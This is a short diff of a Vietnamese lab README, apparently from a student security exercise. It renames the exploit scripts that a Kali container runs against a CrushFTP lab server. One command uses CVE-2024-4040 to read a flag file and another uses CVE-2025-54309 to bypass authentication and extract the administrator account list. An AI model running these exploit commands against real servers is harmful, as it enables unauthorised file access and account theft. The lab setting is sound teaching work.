@@ -59,13 +59,13 @@ docker compose up -d
 
 2. **Khai thác lỗ hổng CVE-2024-4040 đọc file cờ bí mật:**
    ```powershell
-   docker exec -it attacker_kali python3 /root/exploits/read_file.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
+   docker exec -it attacker_kali python3 /root/exploits/read_file_CVE_2024_4040.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
    ```
    > Kết quả trả về cờ bí mật: `NHOM05-CVE4040-LAB-ONLY`.
 
 3. **Khai thác lỗ hổng CVE-2025-54309 (Bypass Authentication):**
    ```powershell
-   docker exec -it attacker_kali python3 /root/exploits/watchTowr-vs-CrushFTP-CVE-2025-54309.py http://10.10.10.128:8080
+   docker exec -it attacker_kali python3 /root/exploits/attack_CVE_2025_54309.py http://10.10.10.128:8080
    ```
    > Kết quả: Vượt qua xác thực và trích xuất danh sách tài khoản quản trị.
 
